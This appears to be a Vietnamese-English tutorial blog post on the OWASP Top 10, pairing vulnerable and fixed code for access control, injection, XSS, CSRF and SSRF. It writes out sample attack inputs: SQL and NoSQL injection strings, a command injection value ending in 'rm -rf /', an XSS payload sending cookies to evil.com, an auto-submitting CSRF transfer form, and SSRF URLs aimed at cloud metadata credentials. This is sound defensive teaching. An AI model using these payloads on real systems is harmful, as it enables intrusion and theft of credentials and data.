---
layout: post
title: "Web Security - OWASP Top 10"
date: 2026-06-01
categories: [security]
tags: [owasp, injection, xss, csrf, ssrf, web-security]
---

## Mục lục
1. [Góc nhìn tổng quan - 10 lỗ hổng nguy hiểm nhất](#overview)
2. [A01: Broken Access Control](#a01)
3. [A02: Cryptographic Failures](#a02)
4. [A03: Injection (SQL, NoSQL, OS)](#a03)
5. [A07: XSS - Cross-Site Scripting](#xss)
6. [CSRF - Cross-Site Request Forgery](#csrf)
7. [A10: SSRF - Server-Side Request Forgery](#ssrf)
8. [A04: Insecure Design](#insecure-design)
9. [A05: Security Misconfiguration](#misconfig)
10. [Tổng kết và prevention checklist](#tong-ket)

---

## 1. Góc nhìn tổng quan {#overview}

OWASP Top 10 (2021) = 10 rủi ro bảo mật web nghiêm trọng nhất:
```
A01: Broken Access Control (94% apps tested)
A02: Cryptographic Failures
A03: Injection
A04: Insecure Design
A05: Security Misconfiguration
A06: Vulnerable Components
A07: Identification & Auth Failures
A08: Software & Data Integrity Failures
A09: Security Logging & Monitoring Failures
A10: Server-Side Request Forgery (SSRF)
```

---

## 2. A01: Broken Access Control {#a01}

```python
# IDOR (Insecure Direct Object Reference)
# ❌ Vulnerable:
@app.get("/api/orders/{order_id}")
def get_order(order_id):
    return db.get_order(order_id)  # Any user can access ANY order!

# ✅ Fixed:
@app.get("/api/orders/{order_id}")
def get_order(order_id, current_user):
    order = db.get_order(order_id)
    if order.user_id != current_user.id:
        raise HTTPException(403, "Access denied")
    return order

# Other access control failures:
# - Modifying URL: /admin → accessible without admin role
# - Modifying request: changing user_id in POST body
# - Missing function-level access control
# - CORS misconfiguration allowing unauthorized origins
```

---

## 3. A03: Injection {#a03}

```python
# SQL Injection
# ❌ Vulnerable:
query = f"SELECT * FROM users WHERE email = '{email}' AND password = '{password}'"
# Attack: email = "admin'--" → bypasses password check!
# Attack: email = "'; DROP TABLE users;--" → deletes table!

# ✅ Fixed (parameterized queries):
cursor.execute("SELECT * FROM users WHERE email = %s AND password = %s", (email, password))

# NoSQL Injection (MongoDB)
# ❌ Vulnerable:
db.users.find({"email": req.body.email, "password": req.body.password})
# Attack: {"password": {"$gt": ""}} → always true!

# ✅ Fixed:
if (typeof req.body.password !== 'string') throw Error("Invalid input");
db.users.find({email: sanitize(email), password: hash(password)});

# OS Command Injection
# ❌ Vulnerable:
os.system(f"ping {user_input}")
# Attack: user_input = "google.com; rm -rf /"

# ✅ Fixed:
subprocess.run(["ping", "-c", "4", validated_hostname], capture_output=True)
```

---

## 4. XSS - Cross-Site Scripting {#xss}

```html
<!-- Stored XSS: Malicious script saved in database -->
<!-- User posts comment: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script> -->
<!-- Every visitor's browser executes the script! -->

<!-- Prevention: -->
<!-- 1. Output encoding (escape HTML) -->
<!-- 2. Content-Security-Policy header -->
<!-- 3. HttpOnly cookies (JS can't access) -->

<!-- Reflected XSS: Script in URL parameter -->
<!-- https://site.com/search?q=<script>alert('XSS')</script> -->
<!-- Server reflects input without encoding -->

<!-- DOM-based XSS: Client-side manipulation -->
<!-- document.getElementById('output').innerHTML = location.hash; -->
<!-- URL: site.com/#<img src=x onerror=alert('XSS')> -->

<!-- CSP Header (Defense in Depth): -->
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123';
```

---

## 5-6. CSRF & SSRF {#csrf}

### CSRF
```html
<!-- Attacker's site includes: -->
<form action="https://bank.com/transfer" method="POST" id="evil">
  <input name="to" value="attacker-account">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('evil').submit();</script>
<!-- If user is logged into bank → transfer executes! -->

<!-- Prevention: -->
<!-- 1. CSRF tokens (unique per session/request) -->
<!-- 2. SameSite cookies (SameSite=Strict or Lax) -->
<!-- 3. Check Origin/Referer headers -->
```

### SSRF (A10)
```python
# ❌ Vulnerable:
@app.get("/fetch")
def fetch_url(url):
    return requests.get(url).text  # User controls URL!

# Attack: url=http://169.254.169.254/latest/meta-data/
# → Fetches AWS instance metadata (credentials!)
# Attack: url=http://internal-service:8080/admin
# → Access internal services!

# ✅ Prevention:
# 1. Allowlist of permitted domains/IPs
# 2. Block private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x)
# 3. Disable HTTP redirects
# 4. Use IMDSv2 (requires token for metadata)
```

---

## 7-10. Insecure Design, Misconfig, Checklist {#insecure-design}

### Prevention Checklist
```
☐ Input validation (whitelist, not blacklist)
☐ Output encoding (context-aware escaping)
☐ Parameterized queries (no string concatenation)
☐ Authentication (MFA, rate limiting, password policies)
☐ Authorization checks on every endpoint
☐ CSRF tokens for state-changing operations
☐ Security headers (CSP, HSTS, X-Frame-Options)
☐ Dependencies scanning (npm audit, Snyk)
☐ HTTPS everywhere (HSTS preload)
☐ Logging & monitoring (detect attacks)
☐ Error handling (no stack traces to users)
☐ CORS properly configured
```

---
